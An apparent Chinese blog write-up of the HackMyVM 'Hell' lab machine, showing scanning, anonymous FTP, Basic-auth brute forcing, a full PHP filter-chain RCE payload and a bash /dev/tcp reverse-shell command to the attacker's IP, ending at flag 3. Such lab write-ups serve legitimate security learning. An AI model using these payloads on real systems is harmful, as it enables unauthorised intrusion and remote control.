<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="ta0"><meta name="copyright" content="ta0"><meta name="generator" content="Hexo 7.1.1"><meta name="theme" content="hexo-theme-yun"><title>HackMyVM-Hell | ta0的小站</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/star-markdown-css@0.4.1/dist/yun/yun-markdown.min.css"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/prism-theme-vars/base.css"><script src="https://fastly.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>function initScrollReveal() {
  [".post-card",".markdown-body img"].forEach((target)=> {
    ScrollReveal().reveal(target);
  })
}
document.addEventListener("DOMContentLoaded", initScrollReveal);
document.addEventListener("pjax:success", initScrollReveal);
</script><link rel="icon" type="image/png" href="/myfa.ico"><link rel="mask-icon" href="/myfa.ico" color="#0078E7"><link rel="preload" href="/css/mycss.css" as="style"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><link rel="preconnect" href="https://fastly.jsdelivr.net/npm/" crossorigin><script id="yun-config">
    window.Yun = {}
    window.CONFIG = {"hostname":"tao0845.github.io","root":"/","title":"做点小小记录","version":"1.10.11","mode":"time","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"搜索...","empty":"找不到您查询的内容: ${query}","hits":"找到 ${hits} 条结果","hits_time":"找到 ${hits} 条结果（用时 ${time} 毫秒）"},"anonymous_image":"https://cdn.yunyoujun.cn/img/avatar/none.jpg","say":{"api":"https://el-bot-api.vercel.app/api/words/young"},"local_search":{"path":"/search.xml"},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"fireworks":{"colors":null},"vendors":{"host":"https://fastly.jsdelivr.net/npm/","darken":"https://fastly.jsdelivr.net/npm/darken@1.5.0"}};
  </script><link rel="stylesheet" href="/css/mycss.css"><script src="/js/hexo-theme-yun.js" type="module"></script><link rel="alternate" href="/atom.xml" title="ta0的小站" type="application/atom+xml"><meta name="description" content="难度:hard kali:192.168.56.104 靶机:192.168.56.199 readmeWhen booting the machine log in with the credentials:  run:run   And execute the command: sudo run  &gt; arp-scan -l                                Int">
<meta property="og:type" content="article">
<meta property="og:title" content="HackMyVM-Hell">
<meta property="og:url" content="https://tao0845.github.io/posts/709c1b3d/index.html">
<meta property="og:site_name" content="ta0的小站">
<meta property="og:description" content="难度:hard kali:192.168.56.104 靶机:192.168.56.199 readmeWhen booting the machine log in with the credentials:  run:run   And execute the command: sudo run  &gt; arp-scan -l                                Int">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://ooo.0x0.ooo/2024/07/17/ORkrpc.png">
<meta property="og:image" content="https://ooo.0x0.ooo/2024/07/17/ORkZBM.png">
<meta property="og:image" content="https://ooo.0x0.ooo/2024/07/17/ORky01.png">
<meta property="og:image" content="https://ooo.0x0.ooo/2024/07/17/ORkgwI.png">
<meta property="og:image" content="https://ooo.0x0.ooo/2024/07/17/ORkp1D.png">
<meta property="og:image" content="https://ooo.0x0.ooo/2024/07/17/ORkJHF.png">
<meta property="og:image" content="https://ooo.0x0.ooo/2024/07/17/ORkP86.png">
<meta property="og:image" content="https://ooo.0x0.ooo/2024/07/17/ORktxP.png">
<meta property="og:image" content="https://ooo.0x0.ooo/2024/07/17/ORk4Jb.png">
<meta property="og:image" content="https://ooo.0x0.ooo/2024/07/17/ORkLBg.png">
<meta property="og:image" content="https://ooo.0x0.ooo/2024/07/17/ORkEZB.png">
<meta property="og:image" content="https://ooo.0x0.ooo/2024/07/17/ORkSMK.png">
<meta property="og:image" content="https://ooo.0x0.ooo/2024/07/17/ORkSMK.png">
<meta property="og:image" content="https://ooo.0x0.ooo/2024/07/17/ORxz9b.png">
<meta property="og:image" content="https://ooo.0x0.ooo/2024/07/17/ORkSMK.png">
<meta property="og:image" content="https://ooo.0x0.ooo/2024/07/17/ORxz9b.png">
<meta property="og:image" content="https://ooo.0x0.ooo/2024/07/17/ORzm26.png">
<meta property="og:image" content="https://ooo.0x0.ooo/2024/07/17/ORzYqX.png">
<meta property="article:published_time" content="2024-07-16T22:48:42.773Z">
<meta property="article:modified_time" content="2024-07-17T13:51:41.200Z">
<meta property="article:author" content="ta0">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://ooo.0x0.ooo/2024/07/17/ORkrpc.png"><script>(function() {
  if (CONFIG.mode !== 'auto') return
  const prefersDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches
  const setting = localStorage.getItem('darken-mode') || 'auto'
  if (setting === 'dark' || (prefersDark && setting !== 'light'))
    document.documentElement.classList.toggle('dark', true)
})()</script></head><body><script src="https://code.iconify.design/2/2.1.1/iconify.min.js"></script><script>// Define global variable
IconifyProviders = {
  // Empty prefix: overwrite default API provider configuration
  '': {
    // Use custom API first, use Iconify public API as backup
    resources: [
        'https://api.iconify.design',
    ],
    // Wait for 1 second before switching API hosts
    rotate: 1000,
  },
};</script><script defer src="https://fastly.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js" type="module"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js" type="module"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="文章目录"><span class="icon iconify" data-icon="ri:list-ordered"></span></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="站点概览"><span class="icon iconify" data-icon="ri:passport-line"></span></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="ta0"><img width="96" loading="lazy" src="/123.jpg" alt="ta0"></a><div class="site-author-name"><a href="/about/">ta0</a></div><span class="site-name">ta0的小站</span><sub class="site-subtitle">网安小白的成长记录</sub><div class="site-description">Learning For Fun</div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="首页"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:home-4-line"></span></span></a><div class="site-state-item"><a href="/archives/" title="归档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:archive-line"></span></span><span class="site-state-item-count">97</span></a></div><div class="site-state-item"><a href="/categories/" title="分类"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:folder-2-line"></span></span><span class="site-state-item-count">13</span></a></div><div class="site-state-item"><a href="/tags/" title="标签"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="site-state-item-count">151</span></a></div><a class="site-state-item hty-icon-button" target="_blank" rel="noopener" href="https://yun.yunyoujun.cn" title="文档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:settings-line"></span></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/tao0845" title="GitHub" target="_blank" style="color:#6e5494"><span class="icon iconify" data-icon="ri:github-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://music.163.com/#/user/home?id=312924699" title="网易云音乐" target="_blank" style="color:#C20C0C"><span class="icon iconify" data-icon="ri:netease-cloud-music-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="mailto:2814928906@qq.com" title="E-Mail" target="_blank" style="color:#8E71C1"><span class="icon iconify" data-icon="ri:mail-line"></span></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="我的小伙伴们" style="color:dodgerblue"><span class="icon iconify" data-icon="ri:genderless-line"></span></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><span class="icon iconify" data-icon="ri:contrast-2-line"></span></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#readme"><span class="toc-number">1.</span> <span class="toc-text">readme</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">2.</span> <span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ftp%E5%8C%BF%E5%90%8D%E7%99%BB%E5%BD%95"><span class="toc-number">3.</span> <span class="toc-text">ftp匿名登录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Authorization%E7%88%86%E7%A0%B4"><span class="toc-number">4.</span> <span class="toc-text">Authorization爆破</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ssrf"><span class="toc-number">5.</span> <span class="toc-text">ssrf</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#socks%E4%BB%A3%E7%90%86"><span class="toc-number">6.</span> <span class="toc-text">socks代理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web%E6%8E%A2%E6%B5%8B2"><span class="toc-number">7.</span> <span class="toc-text">web探测2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5"><span class="toc-number">8.</span> <span class="toc-text">sql注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ssh%E8%BF%9E%E6%8E%A5"><span class="toc-number">9.</span> <span class="toc-text">ssh连接</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%8A%AB%E6%8C%81"><span class="toc-number">10.</span> <span class="toc-text">环境变量劫持</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sudo%E6%8F%90%E6%9D%83"><span class="toc-number">11.</span> <span class="toc-text">sudo提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SUID%E6%8F%90%E6%9D%83"><span class="toc-number">12.</span> <span class="toc-text">SUID提权</span></a></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article" style="--smc-primary:#0078E7;"><link itemprop="mainEntityOfPage" href="https://tao0845.github.io/posts/709c1b3d/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="ta0"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="ta0的小站"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">HackMyVM-Hell</h1><div class="post-meta"><div class="post-time" style="display:block"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-line"></span></span> <time title="创建时间：2024-07-17 06:48:42" itemprop="dateCreated datePublished" datetime="2024-07-17T06:48:42+08:00">2024-07-17</time></div><span class="post-count"><span class="post-symbolcount"><span class="post-meta-item-icon" title="本文字数"><span class="icon iconify" data-icon="ri:file-word-line"></span></span> <span title="本文字数">6k</span><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="阅读时长"><span class="icon iconify" data-icon="ri:timer-line"></span></span> <span title="阅读时长">35m</span></span></span><span class="post-busuanzi"><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="阅读次数"><span class="icon iconify" data-icon="ri:eye-line"></span> <span id="busuanzi_value_page_pv"></span></span></span><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><span class="icon iconify" data-icon="ri:folder-line"></span></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/HackMyVM/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">HackMyVM</span></a></span></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body"><p><strong>难度:hard</strong></p>
<p><strong>kali:192.168.56.104</strong></p>
<p><strong>靶机:192.168.56.199</strong></p>
<h2 id="readme"><a href="#readme" class="headerlink" title="readme"></a>readme</h2><pre class="language-bash" data-language="bash"><code class="language-bash">When booting the machine log <span class="token keyword">in</span> with the credentials: 
run:run 

And execute the command:
<span class="token function">sudo</span> run</code></pre>
<p><img src="https://ooo.0x0.ooo/2024/07/17/ORkrpc.png" alt="ORkrpc.png" loading="lazy"></p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> arp-scan <span class="token parameter variable">-l</span>                              

Interface: eth0, type: EN10MB, MAC: 00:0c:29:d2:e0:49, IPv4: <span class="token number">192.168</span>.56.104
Starting arp-scan <span class="token number">1.10</span>.0 with <span class="token number">256</span> hosts <span class="token punctuation">(</span>https://github.com/royhills/arp-scan<span class="token punctuation">)</span>
<span class="token number">192.168</span>.56.1    0a:00:27:00:00:05       <span class="token punctuation">(</span>Unknown: locally administered<span class="token punctuation">)</span>
<span class="token number">192.168</span>.56.100  08:00:27:21:f5:04       PCS Systemtechnik GmbH
<span class="token number">192.168</span>.56.199  08:00:27:07:06:4d       PCS Systemtechnik GmbH</code></pre>
<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><pre class="language-bash" data-language="bash"><code class="language-bash"> ~/Desktop                                                                                                                                                                  root@kali2  06:54:31 
<span class="token operator">></span> nmap <span class="token number">192.168</span>.56.199
Starting Nmap <span class="token number">7</span>.94SVN <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2024</span>-07-17 06:54 CST
Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.56.199
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.00023s latency<span class="token punctuation">)</span>.
Not shown: <span class="token number">997</span> closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>
PORT   STATE SERVICE
<span class="token number">21</span>/tcp <span class="token function">open</span>  <span class="token function">ftp</span>
<span class="token number">22</span>/tcp <span class="token function">open</span>  <span class="token function">ssh</span>
<span class="token number">80</span>/tcp <span class="token function">open</span>  http
MAC Address: 08:00:27:07:06:4D <span class="token punctuation">(</span>Oracle VirtualBox virtual NIC<span class="token punctuation">)</span>

Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">0.15</span> seconds

 ~/Desktop                                                                                                                                                                  root@kali2  06:54:42 
<span class="token operator">></span> nmap <span class="token number">192.168</span>.56.199 -p21,22,80 <span class="token parameter variable">-sV</span> <span class="token parameter variable">-A</span>
Starting Nmap <span class="token number">7</span>.94SVN <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2024</span>-07-17 06:54 CST
Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.56.199
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.00018s latency<span class="token punctuation">)</span>.

PORT   STATE SERVICE VERSION
<span class="token number">21</span>/tcp <span class="token function">open</span>  <span class="token function">ftp</span>     vsftpd <span class="token number">3.0</span>.5
<span class="token operator">|</span> ftp-syst: 
<span class="token operator">|</span>   STAT: 
<span class="token operator">|</span> FTP server status:
<span class="token operator">|</span>      Connected to ::ffff:192.168.56.104
<span class="token operator">|</span>      Logged <span class="token keyword">in</span> as <span class="token function">ftp</span>
<span class="token operator">|</span>      TYPE: ASCII
<span class="token operator">|</span>      No session bandwidth limit
<span class="token operator">|</span>      Session <span class="token function">timeout</span> <span class="token keyword">in</span> seconds is <span class="token number">300</span>
<span class="token operator">|</span>      Control connection is plain text
<span class="token operator">|</span>      Data connections will be plain text
<span class="token operator">|</span>      At session startup, client count was <span class="token number">1</span>
<span class="token operator">|</span>      vsFTPd <span class="token number">3.0</span>.5 - secure, fast, stable
<span class="token operator">|</span>_End of status
<span class="token operator">|</span> ftp-anon: Anonymous FTP login allowed <span class="token punctuation">(</span>FTP code <span class="token number">230</span><span class="token punctuation">)</span>
<span class="token operator">|</span>_-rw-r--r--    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">0</span>             <span class="token number">256</span> Feb <span class="token number">16</span>  <span class="token number">2023</span> flag.txt
<span class="token number">22</span>/tcp <span class="token function">open</span>  <span class="token function">ssh</span>     OpenSSH <span class="token number">8</span>.9p1 Ubuntu 3ubuntu0.1 <span class="token punctuation">(</span>Ubuntu Linux<span class="token punctuation">;</span> protocol <span class="token number">2.0</span><span class="token punctuation">)</span>
<span class="token operator">|</span> ssh-hostkey: 
<span class="token operator">|</span>   <span class="token number">256</span> <span class="token number">84</span>:9f:33:ed:c5:e2:11:ff:20:7d:0e:d5:31:1a:f0:08 <span class="token punctuation">(</span>ECDSA<span class="token punctuation">)</span>
<span class="token operator">|</span>_  <span class="token number">256</span> b8:bc:0e:e3:84:af:21:ee:fb:cc:93:41:7d:9b:54:75 <span class="token punctuation">(</span>ED25519<span class="token punctuation">)</span>
<span class="token number">80</span>/tcp <span class="token function">open</span>  http    Apache httpd <span class="token number">2.4</span>.52
<span class="token operator">|</span> http-auth: 
<span class="token operator">|</span> HTTP/1.1 <span class="token number">401</span> Unauthorized<span class="token punctuation">\</span>x0D
<span class="token operator">|</span>_  Basic <span class="token assign-left variable">realm</span><span class="token operator">=</span>Restricted Content
<span class="token operator">|</span>_http-server-header: Apache/2.4.52 <span class="token punctuation">(</span>Ubuntu<span class="token punctuation">)</span>
<span class="token operator">|</span>_http-title: <span class="token number">401</span> Unauthorized
MAC Address: 08:00:27:07:06:4D <span class="token punctuation">(</span>Oracle VirtualBox virtual NIC<span class="token punctuation">)</span>
Warning: OSScan results may be unreliable because we could not <span class="token function">find</span> at least <span class="token number">1</span> <span class="token function">open</span> and <span class="token number">1</span> closed port
Device type: general purpose
Running: Linux <span class="token number">4</span>.X<span class="token operator">|</span><span class="token number">5</span>.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux <span class="token number">4.15</span> - <span class="token number">5.8</span>
Network Distance: <span class="token number">1</span> hop
Service Info: Host: <span class="token number">172.17</span>.0.2<span class="token punctuation">;</span> OSs: Unix, Linux<span class="token punctuation">;</span> CPE: cpe:/o:linux:linux_kernel</code></pre>
<h2 id="ftp匿名登录"><a href="#ftp匿名登录" class="headerlink" title="ftp匿名登录"></a>ftp匿名登录</h2><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> <span class="token function">ftp</span> <span class="token number">192.168</span>.56.199
Connected to <span class="token number">192.168</span>.56.199.
<span class="token number">220</span> <span class="token punctuation">(</span>vsFTPd <span class="token number">3.0</span>.5<span class="token punctuation">)</span>
Name <span class="token punctuation">(</span><span class="token number">192.168</span>.56.199:root<span class="token punctuation">)</span>: anonymous
<span class="token number">331</span> Please specify the password.
Password: 
<span class="token number">230</span> Login successful.
Remote system <span class="token builtin class-name">type</span> is UNIX.
Using binary mode to transfer files.
ftp<span class="token operator">></span> <span class="token function">ls</span> <span class="token parameter variable">-al</span>
<span class="token number">229</span> Entering Extended Passive Mode <span class="token punctuation">(</span><span class="token operator">||</span><span class="token operator">|</span><span class="token number">29460</span><span class="token operator">|</span><span class="token punctuation">)</span>
<span class="token number">150</span> Here comes the directory listing.
drwxr-xr-x    <span class="token number">2</span> <span class="token number">0</span>        <span class="token number">115</span>          <span class="token number">4096</span> Feb <span class="token number">16</span>  <span class="token number">2023</span> <span class="token builtin class-name">.</span>
drwxr-xr-x    <span class="token number">2</span> <span class="token number">0</span>        <span class="token number">115</span>          <span class="token number">4096</span> Feb <span class="token number">16</span>  <span class="token number">2023</span> <span class="token punctuation">..</span>
-rw-r--r--    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">0</span>              <span class="token number">34</span> Feb <span class="token number">16</span>  <span class="token number">2023</span> .passwd
-rw-r--r--    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">0</span>             <span class="token number">256</span> Feb <span class="token number">16</span>  <span class="token number">2023</span> flag.txt
<span class="token number">226</span> Directory send OK.
ftp<span class="token operator">></span> get .passwd
local: .passwd remote: .passwd
<span class="token number">229</span> Entering Extended Passive Mode <span class="token punctuation">(</span><span class="token operator">||</span><span class="token operator">|</span><span class="token number">36827</span><span class="token operator">|</span><span class="token punctuation">)</span>
<span class="token number">150</span> Opening BINARY mode data connection <span class="token keyword">for</span> .passwd <span class="token punctuation">(</span><span class="token number">34</span> bytes<span class="token punctuation">)</span>.
<span class="token number">100</span>% <span class="token operator">|</span>***************************************************************************************************************<span class="token operator">|</span>    <span class="token number">34</span>       <span class="token number">96.80</span> KiB/s    00:00 ETA
<span class="token number">226</span> Transfer complete.
<span class="token number">34</span> bytes received <span class="token keyword">in</span> 00:00 <span class="token punctuation">(</span><span class="token number">54.43</span> KiB/s<span class="token punctuation">)</span>
ftp<span class="token operator">></span> get flag.txt
local: flag.txt remote: flag.txt
<span class="token number">229</span> Entering Extended Passive Mode <span class="token punctuation">(</span><span class="token operator">||</span><span class="token operator">|</span><span class="token number">38750</span><span class="token operator">|</span><span class="token punctuation">)</span>
<span class="token number">150</span> Opening BINARY mode data connection <span class="token keyword">for</span> flag.txt <span class="token punctuation">(</span><span class="token number">256</span> bytes<span class="token punctuation">)</span>.
<span class="token number">100</span>% <span class="token operator">|</span>***************************************************************************************************************<span class="token operator">|</span>   <span class="token number">256</span>       <span class="token number">13.56</span> MiB/s    00:00 ETA
<span class="token number">226</span> Transfer complete.
<span class="token number">256</span> bytes received <span class="token keyword">in</span> 00:00 <span class="token punctuation">(</span><span class="token number">111.35</span> KiB/s<span class="token punctuation">)</span></code></pre>
<p>拿到flag1</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> <span class="token function">cat</span> flag.txt                                                                                  

▄▀█ █▄ █ █▀█ █▄ █ █▄█ █▀▄▀█ █▀█ █ █ █▀
█▀█ █ ▀█ █▄█ █ ▀█  █  █ ▀ █ █▄█ █▄█ ▄█

Flag <span class="token number">1</span>: HELL<span class="token punctuation">&#123;</span>4N0NYM0U5_15_7H3_B357_U53R<span class="token punctuation">&#125;</span></code></pre>
<p>还给了一个密码<code>webserver2023!</code></p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> <span class="token function">cat</span> .passwd   

The password is: webserver2023<span class="token operator">!</span></code></pre>
<h2 id="Authorization爆破"><a href="#Authorization爆破" class="headerlink" title="Authorization爆破"></a>Authorization爆破</h2><p><img src="https://ooo.0x0.ooo/2024/07/17/ORkZBM.png" alt="ORkZBM.png" loading="lazy"><br>需要Authorization认证，尝试爆破一手，正好用给的密码爆破用户名<br><img src="https://ooo.0x0.ooo/2024/07/17/ORky01.png" alt="ORky01.png" loading="lazy"><br><img src="https://ooo.0x0.ooo/2024/07/17/ORkgwI.png" alt="ORkgwI.png" loading="lazy"><br><code>beilul:webserver2023!</code><br>登录<br><img src="https://ooo.0x0.ooo/2024/07/17/ORkp1D.png" alt="ORkp1D.png" loading="lazy"><br>拿到flag2 <code>Flag 2: HELL&#123;BRUT3_F0RC3_M4Y_B3_4N_0P710N&#125;</code></p>
<h2 id="ssrf"><a href="#ssrf" class="headerlink" title="ssrf"></a>ssrf</h2><p><img src="https://ooo.0x0.ooo/2024/07/17/ORkJHF.png" alt="ORkJHF.png" loading="lazy"><br>主要到url可能存在任意文件读取<code>http://192.168.56.199/index.php?profile=eddiedota.html</code><br>直接读会被ban<br><img src="https://ooo.0x0.ooo/2024/07/17/ORkP86.png" alt="ORkP86.png" loading="lazy"><br>尝试一下发现为伪协议可以读<br><img src="https://ooo.0x0.ooo/2024/07/17/ORktxP.png" alt="ORktxP.png" loading="lazy"><br>这下不得不尝试filterRce了<br>php:&#x2F;&#x2F;filter&#x2F;convert.%2569conv.UTF8.CSISO2022KR|convert.base64-encode|convert.%2569conv.UTF8.UTF7|convert.%2569conv.SE2.UTF-16|convert.%2569conv.CSIBM921.NAPLPS|convert.%2569conv.855.CP936|convert.%2569conv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.%2569conv.UTF8.UTF7|convert.%2569conv.SE2.UTF-16|convert.%2569conv.CSIBM1161.IBM-932|convert.%2569conv.MS932.MS936|convert.%2569conv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.%2569conv.UTF8.UTF7|convert.%2569conv.IBM869.UTF16|convert.%2569conv.L3.CSISO90|convert.%2569conv.UCS2.UTF-8|convert.%2569conv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.%2569conv.UTF8.UTF7|convert.%2569conv.8859_3.UTF16|convert.%2569conv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.%2569conv.UTF8.UTF7|convert.%2569conv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.%2569conv.UTF8.UTF7|convert.%2569conv.CP367.UTF-16|convert.%2569conv.CSIBM901.SHIFT_JISX0213|convert.%2569conv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.%2569conv.UTF8.UTF7|convert.%2569conv.INIS.UTF16|convert.%2569conv.CSIBM1133.IBM943|convert.%2569conv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.%2569conv.UTF8.UTF7|convert.%2569conv.CP861.UTF-16|convert.%2569conv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.%2569conv.UTF8.UTF7|convert.%2569conv.865.UTF16|convert.%2569conv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.%2569conv.UTF8.UTF7|convert.%2569conv.SE2.UTF-16|convert.%2569conv.CSIBM1161.IBM-932|convert.%2569conv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.%2569conv.UTF8.UTF7|convert.%2569conv.INIS.UTF16|convert.%2569conv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.%2569conv.UTF8.UTF7|convert.%2569conv.CP861.UTF-16|convert.%2569conv.L4.GB13000|convert.%2569conv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.%2569conv.UTF8.UTF7|convert.%2569conv.UTF8.UTF16LE|convert.%2569conv.UTF8.CSISO2022KR|convert.%2569conv.UCS2.UTF8|convert.%2569conv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.%2569conv.UTF8.UTF7|convert.%2569conv.PT.UTF32|convert.%2569conv.KOI8-U.IBM-932|convert.%2569conv.SJIS.EUCJP-WIN|convert.%2569conv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.%2569conv.UTF8.UTF7|convert.%2569conv.CP367.UTF-16|convert.%2569conv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.%2569conv.UTF8.UTF7|convert.%2569conv.PT.UTF32|convert.%2569conv.KOI8-U.IBM-932|convert.%2569conv.SJIS.EUCJP-WIN|convert.%2569conv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.%2569conv.UTF8.UTF7|convert.%2569conv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.%2569conv.UTF8.UTF7|convert.%2569conv.CP367.UTF-16|convert.%2569conv.CSIBM901.SHIFT_JISX0213|convert.%2569conv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.%2569conv.UTF8.UTF7|convert.%2569conv.CSIBM1161.UNICODE|convert.%2569conv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.%2569conv.UTF8.UTF7|convert.%2569conv.ISO2022KR.UTF16|convert.%2569conv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.%2569conv.UTF8.UTF7|convert.%2569conv.INIS.UTF16|convert.%2569conv.CSIBM1133.IBM943|convert.%2569conv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.%2569conv.UTF8.UTF7|convert.%2569conv.SE2.UTF-16|convert.%2569conv.CSIBM1161.IBM-932|convert.%2569conv.MS932.MS936|convert.%2569conv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.%2569conv.UTF8.UTF7|convert.base64-decode&#x2F;resource&#x3D;php:&#x2F;&#x2F;temp&amp;0&#x3D;whoami<br><img src="https://ooo.0x0.ooo/2024/07/17/ORk4Jb.png" alt="ORk4Jb.png" loading="lazy"><br>确实rce了,反弹shell</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">0</span><span class="token operator">=</span>bash%20-c%20<span class="token string">'bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.56.104%2F4567%20%200%3E%261'</span></code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> <span class="token function">nc</span> <span class="token parameter variable">-lvnp</span> <span class="token number">4567</span>                   
listening on <span class="token punctuation">[</span>any<span class="token punctuation">]</span> <span class="token number">4567</span> <span class="token punctuation">..</span>.
connect to <span class="token punctuation">[</span><span class="token number">192.168</span>.56.104<span class="token punctuation">]</span> from <span class="token punctuation">(</span>UNKNOWN<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token number">192.168</span>.56.199<span class="token punctuation">]</span> <span class="token number">47950</span>
bash: cannot <span class="token builtin class-name">set</span> terminal process group <span class="token punctuation">(</span><span class="token number">38</span><span class="token punctuation">)</span>: Inappropriate ioctl <span class="token keyword">for</span> device
bash: no job control <span class="token keyword">in</span> this shell
www-data@d45eb9e78ad8:/var/www/html$ </code></pre>
<p>拿到flag3</p>
